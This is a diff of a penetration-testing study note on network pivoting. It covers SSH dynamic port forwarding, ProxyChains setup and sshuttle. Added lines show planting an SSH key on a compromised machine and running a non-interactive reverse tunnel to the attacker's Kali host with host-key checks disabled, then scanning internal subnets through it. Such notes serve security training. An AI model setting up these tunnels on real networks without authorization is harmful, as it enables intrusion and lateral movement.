@@ -1,6 +1,4 @@
-
-
-
+<% tp.file.rename("4_Pivoting_A-B")%>
 # Port Redirect
 
 \[Subnets\]                         WAN          |     Subnet  1     |      Subnet 2     |      Subnet 3
@@ -30,35 +28,45 @@ ssh -N -D 0.0.0.0:9999 $user_B@$ip_B
 ```
 (Machine A)
 
-### Remote Dynamic
-
-```bash
-sudo systemctl start ssh
+### Remote Dynamic with ProxyChains and SSH
+##### 1st Setup (kali machine)
+SSH
 ```
-(kali machine)
-
-```bash
-ssh -N -R 9999 kali@$ip_kali
+ssh-keygen -t rsa -b 4096 -f ./id_rsa_kali
+cat ./id_rsa_kali.pub >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
 ```
-(Machine A)
-
+ProxyChains
 ```bash
 nano /etc/proxychains4.conf
 ```
-(kali machine)
-
-##### Use ProxyChains
-With it, tools that do not support socks proxys by default, can be made compatible with the tunnel IF they are (most) dynamically-linked binaries. After configuring it (see below), you can use it by prepending the tool's command with `proxychains`.
-```bash
-nano /etc/proxychains4.conf
-```
+> With it, tools that do not support socks proxys by default, can be made compatible with the tunnel IF they are (most) dynamically-linked binaries.
 > For local redirects add `socks5 $hip 9999` to the end.
 > For remote redirects use `socks5 127.0.0.1 9999`.
 > If socks4 is required, UDP and IPv6 won't be supported.
+##### Use it
+(kali machine)
+```bash
+sudo systemctl start ssh
+```
+In use with port scanning, you might lower `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf` to dramatically increase scanning speed.
 
-In use with port scanning, you might lower `tcp_read_time_out` and `tcp_connect_time_out` in the proxychains config file to dramatically increase scanning speed.
+(Machine A, interactive)
+```bash
+ssh -N -R 9999 kali@$ip_kali
+```
+or
+(Machine A, non-interactive)
+Copy the private key `/ftphome/id_rsa_kali` to machine A. Then, run the following on it:
+```bash
+ssh -f -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_kali -N -R 9999 kali@$hip
+```
 
-### sshuttle
+(kali machine)
+`proxychains <command>` to start e.g. a nmap scan over the pivot
+> Warning: It appears to then not use the IP-Addresses put into `/etc/hosts`
+
+### Remote Dynamic with sshuttle
 > Requires python on machine A!
 
 ```bash
